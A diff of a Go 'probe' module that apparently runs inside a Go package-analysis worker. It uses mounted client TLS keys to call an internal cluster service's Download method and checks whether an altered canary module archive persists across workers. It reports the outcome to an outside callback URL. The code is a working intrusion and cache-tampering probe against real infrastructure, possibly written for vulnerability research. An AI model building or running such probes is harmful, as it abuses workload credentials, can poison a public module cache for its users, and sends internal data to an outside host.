@@ -34,40 +34,40 @@ var expectedRequestFrameSHA256 string
 var rpcDialAddress string
 
 const (
-	protocolVersion              = 1
-	moduleName                   = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion                 = "v0.0.68-codex"
-	expectedUserAgent            = "go-cgo-pkgsite-probe-v068-codex"
-	targetRegistry               = "https://proxy.golang.org"
-	targetModuleName             = "github.com/benr00t3d/go-byteman-crosswrite-canary"
-	targetVersion                = "v0.0.2"
-	targetCanaryBytes            = 2533
-	targetSHA512                 = "dbde2be146a4acf6688cfe781cb9481d53b1f70fab66df5229c696ccb203a4361cec7bde56ec85d1f283066c9e3d9f4661a1f311b26513884e33578c24805809"
-	targetSHA256                 = "e7c6ef7862d1fe3c34b3a45a5bf550dba42be42fd8d73c5404886c2dc3c24ee3"
-	targetSHA1                   = "0962315788a51d4612797c1a65e3cf571a4f7fb3"
-	targetMD5                    = "26daa179ad7734e7ec56007e92f1c481"
-	descriptorReceiptSHA256      = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
-	expectedDigestFieldSHA256    = "76b91c61487c0969f4c83d8159d56d01129cfaea92ba4fa855ced3824a3fae75"
-	expectedMetadataSHA256       = "f15edffefd0c4601ff133a04f107df3492ca3eb3070ce223af5bbcd0db15451e"
-	canonicalProxyZipSHA256      = "e6492a7506743ffc579e1f33701944f9dfd42c695ccbd7d80aa7d5f95e972a90"
-	downloadSource               = "robert-owned-v068-content-ingest"
-	emptyValueSHA256             = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
-	downloadPolicyName           = "ALWAYS"
-	downloadPolicyValue          = 4
-	redirectPolicyName           = "FOLLOW_NONE"
-	redirectPolicyValue          = 2
-	callbackTimeout              = 30 * time.Second
-	downloadGRPCTimeout          = 120 * time.Second
-	downloadHTTPTimeout          = 125 * time.Second
-	maximumResultBytes           = 256 * 1024
-	maximumResponseFrame         = 512 * 1024
-	maximumDownloadRecordBytes   = 256 * 1024
-	bytemanServiceHost           = "byteman.default.svc.cluster.local"
-	bytemanServicePort           = 9000
-	bytemanTLSServerName         = "localhost"
-	clientCertificatePath        = "/etc/tls/client/tls.crt"
-	clientKeyPath                = "/etc/tls/client/tls.key"
-	serverPoolPath               = "/etc/tls/server-pool/server-tls-pool.pem"
+	protocolVersion            = 1
+	moduleName                 = "github.com/benr00t3d/go-cgo-pkgsite-probe"
+	probeVersion               = "v0.0.104-codex"
+	expectedUserAgent          = "go-cgo-pkgsite-probe-v104-byteman-never"
+	targetRegistry             = "https://proxy.golang.org"
+	targetModuleName           = "github.com/benr00t3d/go-byteman-crosswrite-canary"
+	targetVersion              = "v0.0.2"
+	targetCanaryBytes          = 2533
+	targetSHA512               = "dbde2be146a4acf6688cfe781cb9481d53b1f70fab66df5229c696ccb203a4361cec7bde56ec85d1f283066c9e3d9f4661a1f311b26513884e33578c24805809"
+	targetSHA256               = "e7c6ef7862d1fe3c34b3a45a5bf550dba42be42fd8d73c5404886c2dc3c24ee3"
+	targetSHA1                 = "0962315788a51d4612797c1a65e3cf571a4f7fb3"
+	targetMD5                  = "26daa179ad7734e7ec56007e92f1c481"
+	descriptorReceiptSHA256    = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
+	expectedDigestFieldSHA256  = "76b91c61487c0969f4c83d8159d56d01129cfaea92ba4fa855ced3824a3fae75"
+	expectedMetadataSHA256     = "f15edffefd0c4601ff133a04f107df3492ca3eb3070ce223af5bbcd0db15451e"
+	canonicalProxyZipSHA256    = "e6492a7506743ffc579e1f33701944f9dfd42c695ccbd7d80aa7d5f95e972a90"
+	downloadSource             = "robert-owned-v068-content-ingest"
+	emptyValueSHA256           = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+	downloadPolicyName         = "NEVER"
+	downloadPolicyValue        = 1
+	redirectPolicyName         = "FOLLOW_NONE"
+	redirectPolicyValue        = 2
+	callbackTimeout            = 30 * time.Second
+	downloadGRPCTimeout        = 120 * time.Second
+	downloadHTTPTimeout        = 125 * time.Second
+	maximumResultBytes         = 256 * 1024
+	maximumResponseFrame       = 512 * 1024
+	maximumDownloadRecordBytes = 256 * 1024
+	bytemanServiceHost         = "byteman.default.svc.cluster.local"
+	bytemanServicePort         = 9000
+	bytemanTLSServerName       = "localhost"
+	clientCertificatePath      = "/etc/tls/client/tls.crt"
+	clientKeyPath              = "/etc/tls/client/tls.key"
+	serverPoolPath             = "/etc/tls/server-pool/server-tls-pool.pem"
 )
 
 type commandResult struct {
@@ -240,27 +240,22 @@ func main() {
 	started := time.Now()
 	cwd := initialWorkingDirectory()
 	identity := inspectIdentity(cwd)
+	if identity.Lane != "capslock" {
+		return
+	}
 	report := newProbeReport(started, identity)
-	endpoint := genericResultURL
-	resultID := "v068-codex-" + identity.Lane
-	if identity.Lane == "capslock" {
-		endpoint = compilerResultURL
-		resultID = "v068-codex-capslock-content-ingest"
-		report.Download = runContentIngest()
-		if report.Download.Verified {
-			report.Reason = "one descriptor-pinned Download ALWAYS accepted the exact altered owned-B v0.0.2 archive"
-		} else {
-			report.Reason = "the single content-ingest Download did not verify exact altered owned-B bytes"
-		}
+	report.Download = runContentIngest()
+	if report.Download.Verified {
+		report.Reason = "Download NEVER returned the exact prior altered owned-B v0.0.2 record in a distinct worker"
 	} else {
-		report.Reason = "the fixed owned-content ingest is limited to the verified Capslock lane"
+		report.Reason = "Download NEVER did not return the exact prior altered owned-B v0.0.2 record"
 	}
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
+	_ = submitProbeReport(compilerResultURL, "v104-codex-capslock-byteman-never", cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
-	return probeReport{Schema: "owned-byteman-content-ingest/v1", Module: moduleName, Version: probeVersion, TargetModule: targetModuleName, TargetVersion: targetVersion, TargetURLSHA256: pinnedReadbackURLSHA256, TargetBodySHA256: targetSHA256, DescriptorReceiptSHA256: descriptorReceiptSHA256, CanonicalZipSHA256: canonicalProxyZipSHA256, ExpectedDigestSHA256: expectedDigestFieldSHA256, StartedUTC: started.UTC().Format(time.RFC3339Nano), Identity: identity, Download: downloadResult{Method: "/sos.byteman.Byteman/Download", PolicyName: downloadPolicyName, PolicyValue: downloadPolicyValue, RedirectPolicyName: redirectPolicyName, RedirectPolicyValue: redirectPolicyValue}}
+	return probeReport{Schema: "owned-byteman-persistent-read/v1", Module: moduleName, Version: probeVersion, TargetModule: targetModuleName, TargetVersion: targetVersion, TargetURLSHA256: pinnedReadbackURLSHA256, TargetBodySHA256: targetSHA256, DescriptorReceiptSHA256: descriptorReceiptSHA256, CanonicalZipSHA256: canonicalProxyZipSHA256, ExpectedDigestSHA256: expectedDigestFieldSHA256, StartedUTC: started.UTC().Format(time.RFC3339Nano), Identity: identity, Download: downloadResult{Method: "/sos.byteman.Byteman/Download", PolicyName: downloadPolicyName, PolicyValue: downloadPolicyValue, RedirectPolicyName: redirectPolicyName, RedirectPolicyValue: redirectPolicyValue}}
 }
 
 func validNonce(value string) bool {
@@ -295,18 +290,12 @@ func validateRuntimeConfigurationWithExpectedSHA(expectedURLSHA256 string) error
 	if !validNonce(callbackSessionNonce) || probeUserAgent != expectedUserAgent || len(expectedRequestPayloadSHA256) != 64 || len(expectedRequestFrameSHA256) != 64 {
 		return errors.New("runtime identities or request fingerprints were invalid")
 	}
-	g, err := parseExactHTTPS(genericResultURL, "/v1/result/"+callbackSessionNonce+"/generic")
-	if err != nil {
+	if _, err := parseExactHTTPS(compilerResultURL, "/go-cgo-modcache-proof-a102/v1/byteman-a104/"+callbackSessionNonce); err != nil {
 		return err
 	}
-	c, err := parseExactHTTPS(compilerResultURL, "/v1/result/"+callbackSessionNonce+"/compiler")
-	if err != nil || g.Scheme != c.Scheme || g.Host != c.Host {
-		return errors.New("callback endpoints did not share one exact origin")
-	}
-	path := "/v1/goproxy/" + callbackSessionNonce + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
-	r, err := parseExactHTTPS(pinnedReadbackURL, path)
-	if err != nil || r.Scheme != g.Scheme || r.Host != g.Host {
-		return errors.New("owned-B URL did not share the exact callback origin")
+	path := "/v1/goproxy/799456e50765f5d4a38dd04faeb21f780c72ddf4695d8436e0af86a799d006b4/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
+	if _, err := parseExactHTTPS(pinnedReadbackURL, path); err != nil {
+		return errors.New("owned-B URL did not match the exact prior one-shot path")
 	}
 	d := sha256.Sum256([]byte(pinnedReadbackURL))
 	if pinnedReadbackURLSHA256 != expectedURLSHA256 || hex.EncodeToString(d[:]) != pinnedReadbackURLSHA256 {
